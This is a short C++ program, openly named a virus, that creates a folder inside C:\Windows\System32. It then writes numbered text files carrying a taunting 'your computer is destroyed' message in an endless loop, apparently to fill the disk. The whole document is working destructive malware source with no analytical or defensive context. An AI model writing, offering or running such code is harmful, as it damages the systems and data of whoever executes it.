#include <iostream>
#include <fstream>
#include <string>
#include <direct.h>

int main()
{
    std::size_t i = 0;                                                           
    const char *path = "C:\\Windows\\System32\\Virus\\";                                        
    std::string content = "Your computer is destroyed get a new one. HAHAHA";              
    _mkdir(path);                                                                          
    while (true)                                                                           
    {
        i++;                                                                               
        std::ofstream file;                                                                
        file.open(path + std::to_string(i) + ".txt", std::ios_base::out);                 
        file << content;                                                                   
        file.close();                                                                      
        std::cout << "File created: " + std::to_string(i) + "\r\n";                        
    }
    return -1;
}
//Create code by LoPhong Corporation
